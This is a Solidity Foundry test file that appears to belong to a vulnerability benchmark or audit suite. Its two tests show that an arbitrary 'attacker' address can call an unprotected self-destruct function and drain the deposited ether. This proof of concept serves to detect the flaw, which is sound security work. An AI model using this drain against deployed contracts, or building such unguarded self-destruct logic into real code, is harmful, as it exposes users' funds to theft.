// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_suicide.sol";

contract SimpleSuicideTest is Test {
    SimpleSuicide simpleSuicide;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.prank(owner);
        simpleSuicide = new SimpleSuicide();
    }

    function testAnyoneCanSelfDestruct() public {
        // Deposit funds by owner
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        simpleSuicide.deposit{value: 5 ether}();
        
        console.log("--- BEFORE-Trigger ---");
        uint256 initialContractBalance = address(simpleSuicide).balance;
        uint256 initialAttackerBalance = attacker.balance;
        console.log("Contract balance (wei):", initialContractBalance);
        console.log("Attacker balance (wei):", initialAttackerBalance);

        console.log("--- Trigger: Attacker calls sudicideAnyone() ---");
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone();

        console.log("--- AFTER-Trigger ---");
        uint256 postContractBalance = address(simpleSuicide).balance;
        uint256 postAttackerBalance = attacker.balance;
        console.log("Contract balance (wei):", postContractBalance);
        console.log("Attacker balance (wei):", postAttackerBalance);

        bool fundsStolen = (postContractBalance == 0) && 
                           (postAttackerBalance == initialAttackerBalance + initialContractBalance);
        
        if (fundsStolen) {
            console.log("Vulnerability Exists: Contract balance drained and funds sent to attacker");
        } else {
            console.log("Vulnerability not Exist: Failed to steal funds or incorrect balance change");
        }
    }

    function testContractStillExistsAfterDestruction() public {
        // Deposit funds
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        simpleSuicide.deposit{value: 1 ether}();
        
        console.log("--- BEFORE-Trigger ---");
        uint256 codeSizeBefore = address(simpleSuicide).code.length;
        uint256 contractBalanceBefore = address(simpleSuicide).balance;
        console.log("Contract code size:", codeSizeBefore);
        console.log("Contract balance (wei):", contractBalanceBefore);

        console.log("--- Trigger: Attacker calls sudicideAnyone() ---");
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone();

        console.log("--- AFTER-Trigger ---");
        uint256 codeSizeAfter = address(simpleSuicide).code.length;
        uint256 contractBalanceAfter = address(simpleSuicide).balance;
        console.log("Contract code size:", codeSizeAfter);
        console.log("Contract balance (wei):", contractBalanceAfter);

        bool balanceDrained = (contractBalanceAfter == 0);
        bool codeRemains = (codeSizeAfter > 0);
        
        if (balanceDrained) {
            console.log("Vulnerability Exists: Contract funds drained, balance reset to 0");
        } else {
            console.log("Vulnerability not Exist: Failed to drain contract balance");
        }
    }
}